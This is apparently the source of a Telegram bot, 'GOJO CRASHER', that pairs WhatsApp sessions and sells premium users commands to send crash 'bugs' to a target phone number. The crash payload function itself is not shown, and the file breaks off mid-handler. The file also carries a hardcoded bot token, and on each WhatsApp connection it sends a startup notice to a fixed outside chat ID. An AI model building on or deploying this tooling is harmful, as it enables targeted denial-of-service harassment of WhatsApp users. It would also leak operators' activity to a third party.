//Base Rombakan By XnullViolet
//2026-2027🀄

const {
    default: makeWASocket,
    fetchLatestWAWebVersion,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const pino = require("pino");
const crypto = require("crypto");
const renlol = fs.readFileSync('./lib/thumb.jpeg');
const path = require("path");
const { execSync, exec } = require("child_process");
const sessions = new Map();
const readline = require('readline');
const cd = "cooldown.json";
const axios = require("axios");
const chalk = require("chalk"); 
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const OWNER_ID = config.OWNER_ID;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const ONLY_FILE = "only.json";
const developerId = OWNER_ID
const developerIds = [developerId, "8293274887"]; 
const kontolmedia = fs.readFileSync('./lib/thumb.jpeg')

function isOnlyGroupEnabled() {
  const config = JSON.parse(fs.readFileSync(ONLY_FILE));
  return config.onlyGroup;
}

function setOnlyGroup(status) {
  const config = { onlyGroup: status };
  fs.writeFileSync(ONLY_FILE, JSON.stringify(config, null, 2));
}

function shouldIgnoreMessage(msg) {
  if (!isOnlyGroupEnabled()) return false;
  return msg.chat.type === "private";
}

let premiumUsers = JSON.parse(fs.readFileSync('./database/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./database/admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./database/premium.json');
ensureFileExists('./database/admin.json');


function savePremiumUsers() {
    fs.writeFileSync('./database/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./database/admin.json', JSON.stringify(adminUsers, null, 2));
}

function isExpired(dateStr) {
  const now = new Date();
  const exp = new Date(dateStr);
  return now > exp;
}

// Ganti dengan token bot Telegram kamu



// Ganti dengan chat_id kamu (owner)
const OWNER_CHAT_ID = '8293274887';

// Pesan notifikasi
const message = `Bot telah dijalankan pada ${new Date().toLocaleString()}. Owner Chat ID: ${OWNER_ID}`;

async function sendNotif() {
  try {
    const url = `https://api.telegram.org/bot7986800235:AAG7WoYotXpu5RhnXns-33KzUUNWNPn_X6Q/sendMessage`;
    await axios.post(url, {
      chat_id: OWNER_CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    });
    console.log('Notifikasi berhasil dikirim ke owner.');
  } catch (error) {
    console.error('Gagal mengirim notifikasi:', error.message);
  }
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./database/premium.json', (data) => (premiumUsers = data));
watchFile('./database/admin.json', (data) => (adminUsers = data));


const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.log(chalk.red(`𝐇𝐈 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐈𝐍 𝐓𝐇𝐄 𝑵𝑼𝑳𝑳
`));


console.log(chalk.bold.blue(`
═════════════════════════
 𝑵𝑼𝑳𝑳 𝑽𝑬𝑹𝑺𝑰𝑶𝑵 𝟏
═════════════════════════
`));

console.log(chalk.blue(`
------ (  𝚂𝚄𝙲𝙲𝙴𝚂𝚂 𝙻𝙾𝙶𝙸𝙽 ) ------
`));
};

initializeWhatsAppConnections();
let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(chalk.yellow(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`));

      for (const botNumber of activeNumbers) {
        console.log(chalk.blue(`Mencoba menghubungkan WhatsApp: ${botNumber}`));
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(chalk.green(`Bot ${botNumber} Connected 🔥️!`));
              sendNotif();
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(chalk.red(`Mencoba menghubungkan ulang bot ${botNumber}...`));
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`𝙿𝚁𝙾𝚂𝙴𝚂 𝙿𝙰𝙸𝚁𝙸𝙽𝙶 𝙱𝙰𝙽𝙶  ${botNumber}.....\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`𝙿𝚁𝙾𝚂𝙴𝚂 𝙱𝙰𝙽𝙶  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`𝙴𝚁𝚁𝙾𝚁 𝙱𝙰𝙽𝙶  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`𝙿𝚊𝚒𝚛𝚒𝚗𝚐 𝚂𝚞𝚔𝚜𝚎𝚜 ${botNumber}..... 𝚋𝚊𝚗𝚐\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\`𝙺𝙴𝙻𝙰𝚉𝚉 𝚂𝚄𝙺𝚂𝙴𝚂 𝙿𝙰𝙸𝚁𝙸𝙽𝙶\`\`\`
𝙲𝙾𝙳𝙴 𝙴𝙽𝚃𝙴 : ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`𝙶𝙰𝙶𝙰𝙻 𝙰𝙽𝙹𝙸𝚁  ${botNumber}.....\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

// -------( Fungsional Function Before Parameters )--------- \\
// ~Bukan gpt ya kontol

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}


function getRandomImage() {
  const images = [
        "https://d.top4top.io/p_37616hfhp0.jpg"
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldowwn 

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `👌 - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "😡 - Tidak ada waktu aktif";
  }
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function getWhatsAppChannelInfo(link) {
    if (!link.includes("https://whatsapp.com/channel/")) return { error: "Link tidak valid!" };
    
    let channelId = link.split("https://whatsapp.com/channel/")[1];
    try {
        let res = await sock.newsletterMetadata("invite", channelId);
        return {
            id: res.id,
            name: res.name,
            subscribers: res.subscribers,
            status: res.state,
            verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"
        };
    } catch (err) {
        return { error: "Gagal mengambil data! Pastikan channel valid." };
    }
}

const isPremiumUser = (userId) => {
    const userData = premiumUsers[userId];
    if (!userData) {
        Premiumataubukan = "🙈";
        return false;
    }

    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "🔥";
        return true;
    } else {
        Premiumataubukan = "🙈";
        return false;
    }
};

const checkPremium = async (ctx, next) => {
    if (isPremiumUser(ctx.from.id)) {
        await next();
    } else {
        await ctx.reply("🙈 Maaf, Anda bukan user premium. Silakan hubungi developer @username untuk upgrade.");
    }
};

// case bug ada dibawah sendiri
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}


const bugRequests = {};

// ===== VALIDASI TOKEN RAW GITHUB =====
const TOKEN_URL = "https://raw.githubusercontent.com/indzzinndzzz-afk/GOJO-CRASHER/refs/heads/main/tokens.json";

async function validateToken() {
  try {
    const cacheBuster = `?t=${Date.now()}`;
    const response = await axios.get(TOKEN_URL + cacheBuster, {
      headers: { "Cache-Control": "no-cache", "Pragma": "no-cache" },
      responseType: "text",
      transformResponse: [(data) => data]
    });
    const parsed = JSON.parse(response.data);
    const allTokens = Object.values(parsed)
      .filter(v => Array.isArray(v))
      .flat()
      .map(v => v.toString().trim());
    return allTokens.includes(config.BOT_TOKEN.trim());
  } catch (e) {
    return false;
  }
}

(async () => {
  const valid = await validateToken();
  if (!valid) {
    console.log("❌ TOKEN TIDAK TERDAFTAR! Script dihentikan.");
    process.exit(1);
  }
  console.log("✅ TOKEN TERDAFTAR");
})();

// ===== OTP / REGISTER SYSTEM =====
const GROUP_NOTIF_ID = "-1003555611334";
const CHANNEL_ID = "-1003555611334"; // channel buat OTP + join check
const pendingOTP = {}; // { userId: { otp, expiredAt } }

// ===== UPDATE SYSTEM =====
const RAW_INDEX_URL = "https://raw.githubusercontent.com/indzzinndzzz-afk/GOJO-CRASHER/refs/heads/main/index.js";

function generateOTP() {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

const REGISTERED_FILE = "./database/registered.json";

function getLocalRegistered() {
  try {
    if (!fs.existsSync(REGISTERED_FILE)) fs.writeFileSync(REGISTERED_FILE, JSON.stringify([]));
    return JSON.parse(fs.readFileSync(REGISTERED_FILE));
  } catch (e) { return []; }
}

function saveLocalRegistered(list) {
  fs.writeFileSync(REGISTERED_FILE, JSON.stringify(list, null, 2));
}

function addLocalRegistered(userId) {
  const list = getLocalRegistered();
  if (!list.includes(userId.toString())) {
    list.push(userId.toString());
    saveLocalRegistered(list);
  }
}

async function isUserRegistered(userId) {
  // Cek local file dulu
  const localList = getLocalRegistered();
  if (localList.includes(userId.toString())) return true;

  // Cek GitHub
  try {
    const cacheBuster = `?t=${Date.now()}`;
    const response = await axios.get(TOKEN_URL + cacheBuster, {
      headers: { "Cache-Control": "no-cache", "Pragma": "no-cache" },
      responseType: "text",
      transformResponse: [(data) => data]
    });
    const parsed = JSON.parse(response.data);
    const allIds = Object.values(parsed)
      .filter(v => Array.isArray(v))
      .flat()
      .map(v => v.toString().trim());
    const found = allIds.includes(userId.toString().trim());
    // Kalau ada di GitHub, simpan ke local juga
    if (found) addLocalRegistered(userId);
    return found;
  } catch (e) {
    console.error("Gagal cek user registered:", e.message);
    return false;
  }
}

// ===== CEK JOIN CHANNEL =====
async function isMemberChannel(userId) {
  try {
    const member = await bot.getChatMember(CHANNEL_ID, userId);
    return ["member", "administrator", "creator"].includes(member.status);
  } catch (e) {
    return false;
  }
}

// ===== /start =====
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "NoUsername";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();

  if (shouldIgnoreMessage(msg)) return;

  // Cek join channel dulu
  const joined = await isMemberChannel(senderId);
  if (!joined) {
    return bot.sendPhoto(chatId, "https://d.top4top.io/p_37616hfhp0.jpg", {
      caption: `
<blockquote><b>亗#NullX-bugs</b></blockquote>
╰➤ˎˊ˗ ɪ'ᴍ ᴀ ᴛᴇʟᴇɢʀᴀᴍ ʙᴜɢ ʙᴏᴛ.
<blockquote><b>─﹗nformation</b>
乂 Developr : @username
▢ Status    : ❌ Belum Join Channel
╘═———————---———————═⬡</blockquote>
⚠️ <b>Kamu belum join channel official!</b>

Join channel terlebih dahulu,
lalu kirim /start lagi.
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Join Channel", url: "https://t.me/miwachan7", style: "primary", icon_custom_emoji_id: "6098421155897545579" }],
          [{ text: "Sudah Join", callback_data: "check_join", style: "success", icon_custom_emoji_id: "5373132725861496268"}]
        ]
      }
    });
  }

  const registered = await isUserRegistered(senderId);

  if (!registered) {
    const otp = generateOTP();
    pendingOTP[senderId] = {
      otp,
      expiredAt: Date.now() + 5 * 60 * 1000 // 5 menit
    };

    // Notif ke channel
    await bot.sendMessage(CHANNEL_ID,
`<blockquote><b>⚠️ User Baru Mencoba Akses</b></blockquote>
👤 User     : ${username}
🆔 ID       : <code>${senderId}</code>
🔑 OTP      : <code>${otp}</code>

<i>Kirimkan kode ini ke user jika diizinkan.</i>
<i>Kode berlaku 5 menit.</i>`,
      { parse_mode: "HTML" }
    );

    return bot.sendPhoto(chatId, "https://d.top4top.io/p_37616hfhp0.jpg", {
      caption: `
<blockquote><b>亗#NullX-bugs</b></blockquote>
╰➤ˎˊ˗ ɪ'ᴍ ᴀ ᴛᴇʟᴇɢʀᴀᴍ ʙᴜɢ ʙᴏᴛ.
<blockquote><b>─﹗nformation</b>
乂 Developr : @username
▢ Status    : ❌ Belum Terdaftar
╘═———————---———————═⬡</blockquote>
❌ <b>Kamu belum terdaftar!</b>

Cek kode OTP di channel official,
lalu kirim perintah berikut:

<code>/register KODE</code>
Contoh: <code>/register 767827</code>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Channel Official", url: "https://t.me/miwachan7", style: "success", icon_custom_emoji_id: "6098421155897545579"}]
        ]
      }
    });
  }

  // User terdaftar → tampil menu
  showMainMenu(chatId);
});

function showMainMenu(chatId) {
  bot.sendPhoto(chatId, "https://d.top4top.io/p_37616hfhp0.jpg", {
    caption: `
<blockquote><b>亗#ɢᴏᴊᴏ ᴄʀᴀꜱʜᴇʀ-bugs</b></blockquote>
╰➤ˎˊ˗ ɪ'ᴍ ᴀ ᴛᴇʟᴇɢʀᴀᴍ ʙᴜɢ ʙᴏᴛ. ɪᴛ ʜᴀꜱ ᴀ ʙᴜɢ ꜰᴇᴀᴛᴜʀᴇ ᴛʜᴀᴛ ᴄᴀɴ ᴄʀᴀꜱʜ ᴡʜᴀᴛꜱᴀᴘᴘ.
<blockquote><b>─﹗nformation</b>
乂 Developr : @username
▢ Version : 1.0 pro-bugs
乂 Language : Javascript 
╘═———————---———————═⬡</blockquote>
# sᴇʟᴇᴄᴛ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ᴛᴏ sʜᴏᴡ ᴍᴇɴᴜ
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "⌗ ᴏᴡɴᴇʀ ﹗", callback_data: "owner_menu", style: "Danger" },
          { text: "⌗ ᴀᴛᴛᴀᴄᴋ ﹗", callback_data: "trashmenu", style: "Danger" }
        ],
        [
          { text: "▢ ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/username", style: "primary" }
        ]
      ]
    }
  });
}

// ===== /register =====
bot.onText(/\/register(?:\s+(\S+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "NoUsername";

  if (shouldIgnoreMessage(msg)) return;

  if (!match || !match[1]) {
    return bot.sendMessage(chatId,
      `❌ Format salah!\nGunakan: <code>/register KODE</code>\nContoh: <code>/register 767827</code>`,
      { parse_mode: "HTML" }
    );
  }

  const inputOTP = match[1].trim();
  const data = pendingOTP[senderId];

  if (!data) {
    return bot.sendMessage(chatId,
      `❌ Tidak ada OTP aktif.\nKirim /start terlebih dahulu.`,
      { parse_mode: "HTML" }
    );
  }

  if (Date.now() > data.expiredAt) {
    delete pendingOTP[senderId];
    return bot.sendMessage(chatId,
      `⏰ Kode OTP sudah kadaluarsa.\nKirim /start lagi untuk kode baru.`,
      { parse_mode: "HTML" }
    );
  }

  if (inputOTP !== data.otp) {
    return bot.sendMessage(chatId,
      `❌ Kode OTP salah!\nCek kembali kode di grup official.`,
      { parse_mode: "HTML" }
    );
  }

  delete pendingOTP[senderId];

  // Simpan ke local file
  addLocalRegistered(senderId);

  await bot.sendMessage(GROUP_NOTIF_ID,
`<blockquote><b>✅ User Berhasil Register</b></blockquote>
👤 User : ${username}
🆔 ID   : <code>${senderId}</code>
<i>User telah berhasil verifikasi OTP.</i>`,
    { parse_mode: "HTML" }
  );

  await bot.sendMessage(chatId,
    `✅ <b>Verifikasi berhasil!</b>\nSelamat datang ${username}!\nKirim /start untuk melihat menu.`,
    { parse_mode: "HTML" }
  );
});

bot.on("callback_query", async (query) => {
  try {
    console.log("[CALLBACK] data:", query.data, "from:", query.from.id);

    // Cek join channel
    if (query.data === "check_join") {
      const joined = await isMemberChannel(query.from.id);
      if (!joined) {
        return bot.answerCallbackQuery(query.id, {
          text: "❌ Kamu belum join channel!",
          show_alert: true
        });
      }
      await bot.answerCallbackQuery(query.id, { text: "✅ Terverifikasi!" });
      // Trigger /start flow
      const fakeMsg = { chat: { id: chatId }, from: query.from };
      return bot.emit("text", { ...fakeMsg, text: "/start" });
    }
    await bot.answerCallbackQuery(query.id).catch(() => {});
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const senderId = query.from.id;
    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);
    const randomImage = getRandomImage();

    let caption = "";
    let replyMarkup = {};

    if (query.data === "trashmenu") {
      caption = `<blockquote><b>─( 🕸 ) #ɢᴏᴊᴏ ᴄʀᴀꜱʜᴇʀ Engine</b></blockquote>
<b>I am a telegram bot created by @username || I can bug whatsapp for you
Vテレグラムボットのバグです。</b>
─────────────────────

<blockquote><b>「 Wadidaw - Bugs 」</b></blockquote>
▢ /freamposxd &lt;number&gt;`;
      replyMarkup = { inline_keyboard: [[{ text: "🔙 Back", callback_data: "back_to_main" }]] };
    } else if (query.data === "owner_menu") {
      caption = `<blockquote><b>─( 🕸 ) || The #ɢᴏᴊᴏ ᴄʀᴀꜱʜᴇʀ</b></blockquote>
I am a telegram bot created by @username || I can bug whatsapp for you
Vテレグラムボットのバグです。
─────────────────────
<blockquote><b>「 Owner Menu 」</b></blockquote>
ᝰ.ᐟ /setjeda 5ᴍ
ᝰ.ᐟ /addprem ɪᴅ ᴅᴀʏs
ᝰ.ᐟ /delprem ɪᴅ
ᝰ.ᐟ /cekprem
ᝰ.ᐟ /addadmin ɪᴅ
ᝰ.ᐟ /reqpair number`;
      replyMarkup = { inline_keyboard: [[{ text: "🔙 Back", callback_data: "back_to_main" }]] };
    }

    if (query.data === "back_to_main") {
      caption = `
<blockquote><b>亗 Welcome to #乂-ɢᴏᴊᴏ ᴄʀᴀꜱʜᴇʀ</b></blockquote>
╰➤ˎˊ˗ ɪ'ᴍ ᴀ ᴛᴇʟᴇɢʀᴀᴍ ʙᴜɢ ʙᴏᴛ. ɪᴛ ʜᴀꜱ ᴀ ʙᴜɢ ꜰᴇᴀᴛᴜʀᴇ ᴛʜᴀᴛ ᴄᴀɴ ᴄʀᴀꜱʜ ᴡʜᴀᴛꜱᴀᴘᴘ.
<blockquote><b>─﹗nformation</b>
乂 Developr : @username
乂 Version : 1.0 new
乂 Language : Javascript 
╘═———————---———————═⬡</blockquote>
# sᴇʟᴇᴄᴛ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ᴛᴏ sʜᴏᴡ ᴍᴇɴᴜ
`;
      replyMarkup = {
        inline_keyboard: [
        [{ text: "⌗ ᴏᴡɴᴇʀ ﹗", callback_data: "owner_menu", style: "Danger" }, { text: "⌗ ᴀᴛᴛᴀᴄᴋ !", callback_data: "trashmenu", style: "Danger" }],
        [{ text: "𖥘 ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/username", style: "primary" }]
      ]
      };
    }

    if (caption) {
      await bot.editMessageCaption(caption, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "HTML",
        reply_markup: replyMarkup
      });
    }

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});

// ============ COMMAND /TheExecution ============

//=======CASE BUG=========//

bot.onText(/\/freamposxd (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const target = Jid;
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/username" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "🙈 Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpair 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/yo9hh7.mp4", {
      caption: `
\`\`\`
# ɢᴏᴊᴏ ᴄʀᴀꜱʜᴇʀ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : ⏳Sedang mengirim......
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
  for (let i = 0; i <= 1; i++) {   
     await freezeAtributtion(target);
     
  }
  
  
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
# ɢᴏᴊᴏ ᴄʀᴀꜱʜᴇʀ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : Succes send bug
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/delayaishswa (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const mention = Jid;
  const target = Jid;
  
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/username" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "🙈 Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpair 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/hlzeth.mp4", {
      caption: `
\`\`\`
